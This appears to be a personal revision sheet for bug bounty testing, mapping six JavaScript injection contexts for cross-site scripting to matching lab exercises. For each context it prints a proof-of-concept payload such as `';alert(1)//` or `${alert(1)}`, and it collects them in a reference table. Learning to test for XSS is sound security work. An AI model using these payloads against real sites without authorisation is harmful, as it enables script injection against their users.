# JavaScript Context XSS Bug Bounty Indicators

## Purpose

Connect:

```text
Observation
        ↓
Potential Vulnerability
        ↓
Testing Methodology
        ↓
Related Lab
```

---

# Scenario 1

## Input Inside Script Tag

### Observation

```html
<script>

var input='USER_INPUT';

</script>
```

---

### Test

```html
</script><script>alert(1)</script>
```

---

### Related Lab

```text
Lab18
```

---

# Scenario 2

## Input Inside JavaScript String

### Observation

```javascript
var input='USER_INPUT';
```

---

### Test

```javascript
';alert(1)//
```

---

### Related Labs

```text
Lab19
Lab20
```

---

# Scenario 3

## Quotes Escaped

### Observation

```javascript
'
```

becomes:

```javascript
\'
```

---

### Test

```javascript
\';alert(1)//
```

---

### Related Lab

```text
Lab20
```

---

# Scenario 4

## Input Inside onclick

### Observation

```html
onclick="track('USER_INPUT')"
```

---

### Test

```html
&apos;-alert(1)-&apos;
```

---

### Related Lab

```text
Lab22
```

---

# Scenario 5

## Backticks Present

### Observation

```javascript
var msg=`USER_INPUT`;
```

---

### Detection

```javascript
${7*7}
```

---

### Exploitation

```javascript
${alert(1)}
```

---

### Related Lab

```text
Lab23
```

---

# Scenario 6

## javascript: URL

### Observation

```html
href="javascript:..."
```

---

### Test

```javascript
onerror=alert;throw 1
```

---

### Related Lab

```text
Lab21
```

---

# Quick Context → Payload Reference

| Context | First Payload |
|----------|----------|
| Script Block | `</script><script>alert(1)</script>` |
| JS String | `';alert(1)//` |
| Escaped Quote | `\';alert(1)//` |
| Event Handler | `&apos;-alert(1)-&apos;` |
| Template Literal | `${alert(1)}` |
| JS URL | `onerror=alert;throw 1` |

---

# Personal Revision Note

Always start with:

```text
Where Is My Input Inside JavaScript?
```

Because:

```text
Context
        ↓
Determines
        ↓
Payload
```

This mindset is far more valuable than memorizing payloads.